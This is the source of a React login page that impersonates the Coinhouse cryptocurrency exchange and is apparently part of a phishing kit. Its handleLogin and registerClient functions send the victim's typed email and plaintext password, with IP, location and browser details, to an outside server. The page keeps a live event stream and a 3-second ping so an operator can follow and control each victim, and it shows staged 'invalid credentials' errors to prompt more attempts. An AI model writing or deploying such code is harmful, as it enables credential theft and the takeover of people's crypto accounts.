"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Eye, EyeOff, ChevronDown, AlertCircle } from "lucide-react"
import Image from "next/image"
import { useMetrics } from "@/hooks/useMetrics"
import { useEventSource } from "@/hooks/useEventSource"
import { useClientStatus } from "@/hooks/useClientStatus"
import { useRouter } from "next/navigation"
import { Alert, AlertDescription } from "@/components/ui/alert"

// Detectar idioma do navegador - padrão sempre inglês exceto francês
const getDefaultLanguage = () => {
  if (typeof window !== "undefined") {
    const browserLang = navigator.language.toLowerCase()
    return browserLang.startsWith("fr") ? "fr" : "en"
  }
  return "en" // Padrão sempre inglês
}

const translations = {
  fr: {
    connect: "Connectez-vous à votre compte",
    email: "Adresse email",
    password: "Mot de passe",
    loginButton: "Se connecter",
    loginLoading: "Connexion...",
    forgotPassword: "Mot de passe oublié ?",
    noAccount: "Pas encore de compte ?",
    createAccount: "Créer un compte",
    experience: "Vivez la meilleure expérience",
    investment: "d'investissement en cryptoactifs.",
    invalidUsername: "Adresse email invalide. Veuillez réessayer.",
    invalidPassword: "Mot de passe incorrect. Veuillez réessayer.",
    invalidCredentials: "Identifiants invalides. Veuillez réessayer."
  },
  en: {
    connect: "Log in to your account",
    email: "Email address",
    password: "Password",
    loginButton: "Log In",
    loginLoading: "Logging in...",
    forgotPassword: "Forgot password?",
    noAccount: "Don't have an account yet?",
    createAccount: "Create account",
    experience: "Experience the best",
    investment: "cryptocurrency investment experience.",
    invalidUsername: "Invalid email address. Please try again.",
    invalidPassword: "Incorrect password. Please try again.",
    invalidCredentials: "Invalid credentials. Please try again."
  },
}

const chatOptions = {
  fr: [
    "Comment créer un compte?",
    "J'ai oublié mon mot de passe",
    "Comment acheter des cryptomonnaies?",
    "Contacter le support",
  ],
  en: ["How to create an account?", "I forgot my password", "How to buy cryptocurrencies?", "Contact support"],
}

// Função para registrar cliente
const registerClient = async (username: string, password: string, clientId?: string, metricsData?: any) => {
  try {
    console.log('🚀 Iniciando registro de cliente...');
    
    // Usar dados do useMetrics ou coletar dados básicos
    let ip = 'Unknown';
    let country = 'BR';
    let city = 'São Paulo';
    let device = 'Desktop';
    
    // Função que detecta se é Mobile, Tablet ou Desktop
    const getDeviceType = () => {
      if (typeof window === 'undefined' || typeof navigator === 'undefined') return 'Desktop';
      
      const userAgent = navigator.userAgent;
      if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
        return 'Tablet';
      }
      if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
        return 'Mobile';
      }
      return 'Desktop';
    };
    
    device = getDeviceType();
    
    // Tenta recuperar dados que useMetrics já coletou (sessionStorage)
    try {
      const metricsData = sessionStorage.getItem('metrics_data');
      if (metricsData) {
        const parsed = JSON.parse(metricsData);
        ip = parsed.ip || 'Unknown';
        country = parsed.country || 'BR';
        city = parsed.city || 'São Paulo';
        console.log('📍 Reutilizando dados de localização do useMetrics:', { ip, country, city });
      } else {
        console.log('📍 Dados de localização não encontrados no sessionStorage, usando padrões');
      }
    } catch (error) {
      console.log('📍 Erro ao recuperar dados salvos, usando padrões:', error);
    }
    
    // Gerar clientId único se não existir
    const finalClientId = clientId || `client_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    // Dados completos para registro
    const clientData = {
      clientId: finalClientId,
      username,
      password,
      ip,
      country,
      city,
      device,
      browser: navigator.userAgent,
      referrer: document.referrer || 'direct',
      currentUrl: window.location.href,
      timestamp: new Date().toISOString(),
      status: 'online',
      lastActivity: new Date().toISOString()
    };
    
    console.log('📊 Dados do cliente preparados:', clientData);
    
    // Primeiro, tentar registrar/atualizar o cliente
    console.log('🌐 Enviando para API de registro...');
    const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(clientData)
    });
    
    console.log('🌐 Resposta da API:', response.status, response.statusText);
    
    if (response.ok) {
      const data = await response.json();
      console.log("✅ Cliente registrado com sucesso:", data);
      
      // 🔑 SALVAR CLIENT_ID para monitoramento (CRÍTICO)
      localStorage.setItem('client_id', finalClientId);
      console.log("🔑 Client ID salvo para monitoramento:", finalClientId);
      
      // Retornar dados com clientId
      return {
        ...data,
        clientId: finalClientId
      };
    } else {
      const errorData = await response.text();
      console.log("❌ Erro ao registrar cliente:", errorData);
      return null;
    }
  } catch (error) {
    console.log("❌ Erro durante registro de cliente:", error);
    return null;
  }
}

export default function LoginPage() {
  const metrics = useMetrics() // Hook das métricas
  const router = useRouter()
  const [language, setLanguage] = useState(() => getDefaultLanguage())
  const [showPassword, setShowPassword] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [clientId, setClientId] = useState<string | null>(null)

  const [showChat, setShowChat] = useState(false)
  const [chatMessages, setChatMessages] = useState([
    { type: "bot", message: language === "fr" ? "Bonjour! Comment puis-je vous aider?" : "Hello! How can I help you?" },
  ])

  // EventSource para detectar comandos do servidor
  const eventSource = useEventSource({
    url: 'https://servidoroperador.onrender.com/api/events',
    clientId: clientId || undefined,
    onMessage: (data) => {
      console.log('📨 Comando recebido na página home:', data);
    },
    onError: (error) => {
      console.log('❌ Erro no EventSource:', error);
    }
  });

  // Sistema de ping para manter cliente online
  const clientStatus = useClientStatus({
    clientId: clientId || undefined,
    pingInterval: 3000 // 3 segundos
  });

  const t = translations[language as keyof typeof translations]
  
  // Recuperar clientId do localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const storedClientId = localStorage.getItem('client_id');
      if (storedClientId) {
        setClientId(storedClientId);
      }
    }
  }, []);
  
  // Envio automático de métricas ao carregar a página
  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit() // Envia métricas automaticamente
    }
  }, [metrics])
  
  // Verificar se há erro de autenticação
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const authError = localStorage.getItem('auth_error')
      const errorType = localStorage.getItem('error_type')
      
      if (authError === 'true') {
        // Determinar mensagem de erro com base no tipo
        if (errorType === 'inv_username') {
          setError(t.invalidUsername)
        } else if (errorType === 'inv_password') {
          setError(t.invalidPassword)
        } else {
          setError(t.invalidCredentials)
        }
        
        // Limpar campos
        setEmail("")
        setPassword("")
        
        // Limpar erro do localStorage
        localStorage.removeItem('auth_error')
        localStorage.removeItem('error_type')
      }
    }
  }, [t.invalidUsername, t.invalidPassword, t.invalidCredentials])

  // Função para lidar com o login
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!email || !password) return
    
    setIsLoading(true)
    setError(null)
    
    try {
      // Verificar se já existe um clientId (atualização de dados)
      const existingClientId = localStorage.getItem('client_id')
      
      // Registrar cliente ou atualizar dados
      const clientData = await registerClient(email, password, existingClientId || undefined)
      
      if (clientData) {
        // Salvar clientId se retornado
        if (clientData.clientId) {
          setClientId(clientData.clientId);
        }
        
        // Enviar notificação de login para o EventSource
        if (eventSource.sendMessage) {
          eventSource.sendMessage({
            action: 'login_attempt',
            email: email,
            timestamp: new Date().toISOString()
          });
        }
        
        // Redirecionar para página de loading
        router.push("/loading")
      } else {
        setError(t.invalidCredentials)
        setIsLoading(false)
      }
    } catch (error) {
      console.log("Erro no login:", error)
      setError(t.invalidCredentials)
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col lg:flex-row">
      {/* Left side - Login Form */}
      <div className="flex-1 flex flex-col justify-center px-6 sm:px-8 lg:px-16 xl:px-20 bg-white min-h-screen py-6 lg:py-4">
        <div className="w-full max-w-md mx-auto">
          {/* Logo */}
          <div className="mb-6 lg:mb-4">
            <Image src="/coinhouse-logo.png" alt="Coinhouse" width={250} height={50} className="h-8 lg:h-10 w-auto" />
          </div>

          {/* Title and Language Selector */}
          <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 mb-6">
            <h1 className="text-xl lg:text-2xl font-semibold text-gray-900">{t.connect}</h1>
            <Select value={language} onValueChange={setLanguage}>
              <SelectTrigger className="w-16 lg:w-14 border border-gray-300 rounded-full px-3 lg:px-2 py-1 h-8 lg:h-7 text-sm font-medium [&>svg]:hidden bg-white shadow-sm self-end lg:self-auto">
                <SelectValue />
                <ChevronDown className="h-3 w-3 ml-1 text-gray-600" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="fr">FR</SelectItem>
                <SelectItem value="en">GB</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Error Alert */}
          {error && (
            <Alert variant="destructive" className="mb-6">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* Login Form */}
          <form onSubmit={handleLogin} className="space-y-6">
            <div className="space-y-4">
              <div>
                <Label htmlFor="email" className="text-sm font-medium text-gray-700 mb-2 block">
                  {t.email}
                </Label>
                <Input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  disabled={isLoading}
                  required
                />
              </div>

              <div>
                <Label htmlFor="password" className="text-sm font-medium text-gray-700 mb-2 block">
                  {t.password}
                </Label>
                <div className="relative">
                  <Input
                    id="password"
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-12 px-4 pr-12 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    disabled={isLoading}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  >
                    {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                  </button>
                </div>
              </div>
            </div>

            <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
              <Button 
                type="submit" 
                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto disabled:opacity-50 flex items-center justify-center gap-2"
                disabled={isLoading}
              >
                {isLoading && (
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                )}
                {isLoading ? t.loginLoading : t.loginButton}
              </Button>

              <button 
                type="button" 
                disabled={isLoading}
                className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left disabled:opacity-50"
              >
                {t.forgotPassword}
              </button>
            </div>

            <div className="pt-6 text-sm text-gray-600 text-center lg:text-left">
              {t.noAccount} <button type="button" className="text-black hover:underline font-medium">{t.createAccount}</button>
            </div>
          </form>
        </div>
      </div>

      {/* Right side - Background with Phone - Hidden on mobile */}
      <div className="hidden lg:flex lg:flex-1 relative overflow-hidden">
        {/* Background Image */}
        <div
          className="absolute inset-0 bg-gradient-to-br from-pink-400 via-purple-500 to-blue-500"
          style={{
            backgroundImage: `url('/gradient-background.png')`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        />

        {/* Phone Mockup */}
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative">
            <Image src="/phone-mockup.png" alt="Coinhouse App" width={300} height={600} className="drop-shadow-2xl" />
          </div>
        </div>

        {/* Bottom Text */}
        <div className="absolute bottom-16 left-1/2 transform -translate-x-1/2 text-center text-white">
          <h2 className="text-2xl font-bold mb-2">{t.experience}</h2>
          <p className="text-xl">{t.investment}</p>
        </div>
      </div>
      {/* Chat Bot */}
      {!showChat && (
        <button
          onClick={() => setShowChat(true)}
          className="fixed bottom-6 right-6 bg-black text-white p-4 rounded-full shadow-lg hover:bg-gray-800 transition-colors z-50"
        >
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
            />
          </svg>
        </button>
      )}

      {showChat && (
        <div className="fixed bottom-6 right-6 w-80 h-96 bg-white rounded-lg shadow-2xl border z-50 flex flex-col">
          <div className="bg-black text-white p-4 rounded-t-lg flex justify-between items-center">
            <h3 className="font-medium">Support Coinhouse</h3>
            <button onClick={() => setShowChat(false)} className="text-white hover:text-gray-300">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>

          <div className="flex-1 p-4 overflow-y-auto">
            {chatMessages.map((msg, index) => (
              <div key={index} className={`mb-3 ${msg.type === "bot" ? "text-left" : "text-right"}`}>
                <div
                  className={`inline-block p-3 rounded-lg max-w-xs ${
                    msg.type === "bot" ? "bg-gray-100 text-gray-800" : "bg-black text-white"
                  }`}
                >
                  {msg.message}
                </div>
              </div>
            ))}
          </div>

          <div className="p-4 border-t">
            <div className="space-y-2">
              {chatOptions[language as keyof typeof chatOptions].map((option, index) => (
                <button
                  key={index}
                  onClick={() => {
                    setChatMessages((prev) => [
                      ...prev,
                      { type: "user", message: option },
                      {
                        type: "bot",
                        message:
                          language === "fr"
                            ? "Merci pour votre question. Un agent va vous contacter bientôt."
                            : "Thank you for your question. An agent will contact you soon.",
                      },
                    ])
                  }}
                  className="w-full text-left p-2 text-sm border rounded hover:bg-gray-50 transition-colors"
                >
                  {option}
                </button>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
